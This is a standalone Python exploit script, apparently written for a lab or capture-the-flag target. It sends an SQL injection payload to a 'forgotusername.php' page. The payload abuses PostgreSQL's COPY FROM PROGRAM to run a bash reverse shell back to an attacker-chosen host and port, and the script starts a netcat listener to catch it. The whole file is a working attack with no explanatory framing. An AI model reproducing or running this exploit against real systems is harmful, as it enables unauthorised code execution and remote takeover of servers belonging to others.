import sys, requests, argparse, subprocess, time

s = requests.session()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def delivery(ip, lhost, lport):
    target = "http://%s/forgotusername.php" % ip
    payload = "x';drop table if exists rce; create table rce(output text); copy rce from program 'echo \"bash -i >& /dev/tcp/%s/%s 0>&1\" | bash'; select * from rce; drop table if exists rce;--" % (lhost, lport)
    data = {'username': payload}
    subprocess.Popen(["nc","-lnvp","%s" % lport])
    time.sleep(1)
    s.post(target, data=data, proxies=proxies)
    while True:
	    pass
    
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', help='Target IP address', required=True)
    parser.add_argument('--lhost', help='Local host', required=True)
    parser.add_argument('--lport', help='Local port', required=True)
    args = parser.parse_args()
    ip = args.ip
    lhost = args.lhost
    lport = args.lport
    delivery(ip, lhost, lport)

if __name__ == "__main__":
	main()
